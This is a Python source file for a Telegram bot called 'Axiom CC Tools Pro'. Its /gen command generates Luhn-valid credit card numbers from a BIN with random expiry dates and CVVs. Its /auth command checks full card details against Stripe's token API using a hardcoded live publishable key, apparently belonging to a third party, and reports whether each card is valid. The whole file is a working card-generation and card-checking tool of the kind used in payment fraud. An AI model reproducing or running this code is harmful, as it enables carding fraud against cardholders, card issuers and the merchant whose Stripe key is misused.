import telebot
import random
import time
import requests

# Replace with your actual Bot Token from @BotFather
API_TOKEN = 'YOUR_BOT_TOKEN_HERE'
bot = telebot.TeleBot(API_TOKEN)

# Axiom's Stripe Publishable Key
STRIPE_PK = "pk_live_51Op8d8GLdQ7N2bVjuMWV6qteyKXoHklyfJXorljrH32nZ9vLEJyvfN77EY4Clpdlkd1AN7xjrd17nJWolSI4bpNA004zu0cPZh"

# --- HELPER FUNCTIONS ---

def luhn_checksum(card_number):
    """Validates card number using Luhn Algorithm"""
    digits = [int(x) for x in card_number]
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    checksum = sum(odd_digits)
    for d in even_digits:
        checksum += sum([int(x) for x in str(d * 2)])
    return checksum % 10 == 0

def generate_cc(bin_number):
    """Generates a valid card number based on BIN"""
    cc = str(bin_number)
    target_len = 15 if cc.startswith(('34', '37')) else 16
    while len(cc) < (target_len - 1):
        cc += str(random.randint(0, 9))
    for i in range(10):
        if luhn_checksum(cc + str(i)):
            return cc + str(i)
    return cc + "0"

def get_flag(country_code):
    """Converts Country Code (e.g., US) to Flag Emoji"""
    if not country_code or len(country_code) != 2:
        return "🏳️"
    return "".join(chr(ord(c) + 127397) for c in country_code.upper())

# --- COMMAND HANDLERS ---

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    welcome = (
        "🎴 *Axiom CC Tools Pro*\n\n"
        "Commands:\n"
        "1️⃣ `/gen [BIN] [Amount]` - Generate Cards\n"
        "2️⃣ `/auth [CC|MM|YY|CVV]` - Get Card Info (Stripe)\n\n"
        "Dev: @paingdyan"
    )
    bot.reply_to(message, welcome, parse_mode='Markdown')

@bot.message_handler(commands=['gen'])
def handle_gen(message):
    try:
        args = message.text.split()
        if len(args) < 2:
            bot.reply_to(message, "❌ **Usage:** `/gen [BIN] [Amount]`\nExample: `/gen 453590 10`", parse_mode='Markdown')
            return

        bin_num = args[1]
        
        # Validation for BIN
        if not bin_num.isdigit() or len(bin_num) < 6:
            bot.reply_to(message, "❌ **Error:** Invalid BIN. Must be numbers (Min 6 digits).")
            return

        # Validation for Amount
        try:
            amount = int(args[2]) if len(args) > 2 else 10
            if amount > 100: amount = 100
            if amount < 1: amount = 1
        except ValueError:
            bot.reply_to(message, "❌ **Error:** Amount must be a number.")
            return
        
        status = bot.reply_to(message, "𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴 𝗖𝗮𝗿𝗱𝘀⏳")
        time.sleep(0.5)
        bot.edit_message_text("𝗚𝗲𝗻𝗲𝗿𝗮𝘁𝗶𝗻𝗴 𝗖𝗮𝗿𝗱𝘀⏳", message.chat.id, status.message_id)
        
        results = []
        for _ in range(amount):
            cc_num = generate_cc(bin_num)
            # Generating future dates (Current is 2026)
            m, y = random.randint(1, 12), random.randint(2027, 2033)
            cvv = random.randint(100, 999)
            results.append(f"`{cc_num}|{m:02d}|{y}|{cvv}`")
        
        response = (
            f"𝗖𝗮𝗿𝗱𝘀 𝗚𝗲𝗻𝗲𝗿𝗮𝘁𝗲𝗱✅\n"
            f"𝗕𝗜𝗡 ⇾ `{bin_num}`\n"
            f"𝗔𝗺𝗼𝘂𝗻𝘁 ⇾ {amount}\n\n"
            + "\n".join(results) +
            f"\n\n𝗚𝗲𝗻𝗲𝗿𝗮𝘁𝗲𝗱 𝗕𝘆: @paingdyan"
        )
        bot.edit_message_text(response, message.chat.id, status.message_id, parse_mode='Markdown')
        
    except Exception as e:
        bot.reply_to(message, "⚠️ An error occurred in generation.")

@bot.message_handler(commands=['auth'])
def handle_auth(message):
    try:
        args = message.text.split()
        if len(args) < 2 or "|" not in args[1]:
            bot.reply_to(message, "❌ **Usage:** `/auth cc|mm|yy|cvv`", parse_mode='Markdown')
            return

        parts = args[1].split('|')
        if len(parts) < 4:
            bot.reply_to(message, "❌ **Error:** Missing card details (MM|YY|CVV).")
            return

        cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
        status = bot.reply_to(message, "𝗥𝗲𝘁𝗿𝗶𝗲𝘃𝗶𝗻𝗴 𝗜𝗻𝗳𝗼⏳")

        # Stripe API for Card Info
        url = "https://api.stripe.com/v1/tokens"
        headers = {'Authorization': f'Bearer {STRIPE_PK}'}
        data = {'card[number]': cc, 'card[exp_month]': mm, 'card[exp_year]': yy, 'card[cvc]': cvv}
        
        resp = requests.post(url, headers=headers, data=data).json()

        if 'id' in resp:
            card = resp.get('card', {})
            brand = card.get('brand', 'Unknown').upper()
            country = card.get('country', 'Unknown')
            funding = card.get('funding', 'Unknown').upper()
            flag = get_flag(country)
            
            res = (
                f"💳 **Card Information**\n"
                f"━━━━━━━━━━━━━━━\n"
                f"𝗖𝗮𝗿𝗱: `{cc}|{mm}|{yy}|{cvv}`\n"
                f"𝗦𝘁𝗮𝘁𝘂𝘀: ✅ Valid Auth\n"
                f"━━━━━━━━━━━━━━━\n"
                f"𝗕𝗿𝗮𝗻𝗱: {brand}\n"
                f"𝗧𝘆𝗽𝗲: {funding}\n"
                f"𝗖𝗼𝘂𝗻𝘁𝗿𝐲: {country} {flag}\n"
                f"━━━━━━━━━━━━━━━\n"
                f"𝗗𝗲𝘃: @paingdyan"
            )
        else:
            err = resp.get('error', {}).get('message', 'Declined')
            res = f"❌ **Auth Failed**\nMessage: `{err}`"

        bot.edit_message_text(res, message.chat.id, status.message_id, parse_mode='Markdown')

    except Exception:
        bot.reply_to(message, "❌ Format error. Use: `cc|mm|yy|cvv`.")

print("Axiom's Elite Bot is online... 🚀")
bot.infinity_polling()
